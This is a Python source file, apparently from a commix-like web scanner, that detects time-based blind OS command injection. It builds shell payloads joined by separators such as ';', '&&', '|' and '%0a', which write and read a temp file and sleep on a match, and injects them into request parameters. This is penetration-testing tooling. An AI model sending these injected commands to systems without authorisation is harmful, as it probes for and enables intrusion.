import re
import time
import json
import random
import string
import urlparse
from requests.requests import Requests
from injector import InjectorBase
from utils.config import DefaultConfig
from utils.thread_handler import SelfThread
from utils.debug_module import Log

class TempfileBased(InjectorBase):

    inject_level = 5
    SEPARATORS = [";", "%3B", "&", "%26", "&&", "%26%26", "|", "%7C", "||", "%7C%7C", "%0a", "%0d%0a"] # ""

    def __init__(self, request_obj, request_info):
        super(TempfileBased, self).__init__(request_obj, request_info)
        self.origin_req_time = request_obj.serverRestAPI(self.request_info)['res_time']
        Log.debug('[TempfileBased] The response time of origin request: %f', self.origin_req_time)
        self.time_sec = int(self.origin_req_time + 5)
        self.time_statistics = []

    def decision(self, inject_key):
        for separator in self.SEPARATORS:
            temp_path = DefaultConfig.get_value('TempfileBased', 'TmpFolder')
            # change tag each round in case false positive 
            self.tag = ''.join(random.choice(string.ascii_uppercase) for i in range(6))
            tag_length = len(self.tag) + 4 # need to figure out why commix do this
            file = temp_path + self.tag + '.txt'
            for length in xrange(tag_length):
                # check exit flag
                SelfThread.is_exit()
                time.sleep(eval(DefaultConfig.get_value('System', 'RequestDelay')))

                Log.debug('Start to test with separator: %s, TAG: %s, length: %d, file: %s', separator, self.tag, length, file)
                cmd = self.gen_cmd_for_separator(separator, self.tag, length, self.time_sec, file)
                sent_data = self.replace_func(inject_key, cmd)
                inject_info = {
                    'target': self.current_part,
                    'inject_method': self.__class__.__name__,
                    'inject_key': inject_key,
                    'seperator': separator,
                    'tag': self.tag,
                    'command': cmd
                }
                response_info = self.request_obj.serverRestAPI(self.request_info)
                if self.is_inject_success(response_info['res_time']):
                    inject_result = True
                    self.find_injectable(inject_key, cmd, response_info['res_time'])
                else:
                    inject_result = False
                self.record_traffic_logs(self.request_info.get_record(), inject_info, response_info, inject_result)

    def is_inject_success(self, inject_req_time):
        if (inject_req_time - self.time_sec) > 0:
            if not self.check_false_positive(inject_req_time):
                return True
        self.time_statistics.append(inject_req_time)
        return False

    def check_false_positive(self, inject_req_time):
        # The range of previous response time is not more than time_sec
        if max(self.time_statistics) - min(self.time_statistics) < self.time_sec:
            if inject_req_time > max(self.time_statistics):
                return False
        logging.warning('The response time is unstable, max: %s,min: %s', str(max(self.time_statistics)), str(min(self.time_statistics)))
        return True

    def gen_cmd_for_separator(self, separator, inserted_str, str_length, time_sec, output_file):
        if separator == ';' or separator == '%3B':
            return self.gen_cmd_semicolon(inserted_str, str_length, time_sec, output_file)
        elif '&' in separator or '%26' in separator:
            return self.gen_cmd_and(inserted_str, str_length, time_sec, output_file)
        elif '|' in separator or '%7C' in separator:
            return self.gen_cmd_or(inserted_str, str_length, time_sec, output_file)
        elif '%0a' in separator or '\n' in separator:
            return self.gen_cmd_newline(inserted_str, str_length, time_sec, output_file)

    def gen_cmd_semicolon(self, inserted_str, str_length, time_sec, output_file):
        separator = ';'
        cmd = '{separator}str=$(echo {inserted_str}>{file}){separator}str=$(cat {file}){separator}str1=$(expr length "$str"){separator}if [ {length} -ne ${{str1}} ]{separator}then sleep 0{separator}else sleep {time_sec}{separator}fi '
        return cmd.format(separator=separator, inserted_str=inserted_str, length=str_length, time_sec=time_sec, file=output_file)
    
    def gen_cmd_and(self, inserted_str, str_length, time_sec, output_file):
        separator = '&&'
        ampersand = '&'
        cmd = '{ampersand}sleep 0{separator}' + \
              'str=$(echo {inserted_str}>{file}){separator}' + \
              'str=$(cat {file})' + \
              'str1=$(expr length "$str")' + \
              '[ {length} -eq ${{str1}} ] {separator}' + \
              'sleep {time_sec}'
        return cmd.format(separator=separator, ampersand=ampersand, inserted_str=inserted_str, length=str_length, time_sec=time_sec, file=output_file)
    
    def gen_cmd_or(self, inserted_str, str_length, time_sec, output_file):
        separator = '||'
        ampersand = '|'
        cmd = '{ampersand}echo {inserted_str}>{file}{ampersand}' + \
              '[ {length} -ne $(cat {file}' + \
              '{ampersand}tr -d \'\\n\'' + \
              '{ampersand}wc -c) ] {separator}' + \
              'sleep {time_sec}'
        return cmd.format(separator=separator, ampersand=ampersand, inserted_str=inserted_str, length=str_length, time_sec=time_sec, file=output_file)
    
    def gen_cmd_newline(self, inserted_str, str_length, time_sec, output_file):
        if self.current_part == 'Headers':
            separator = '%0a'
        else:
            separator = '\n'
        cmd = '{separator}str=$(echo {inserted_str}>{file}){separator}str=$(cat {file}){separator}str1=$(expr length "$str"){separator}if [ {length} -ne ${{str1}} ]{separator}then sleep 0{separator}else sleep {time_sec}{separator}fi '
        return cmd.format(separator=separator, inserted_str=inserted_str, length=str_length, time_sec=time_sec, file=output_file)
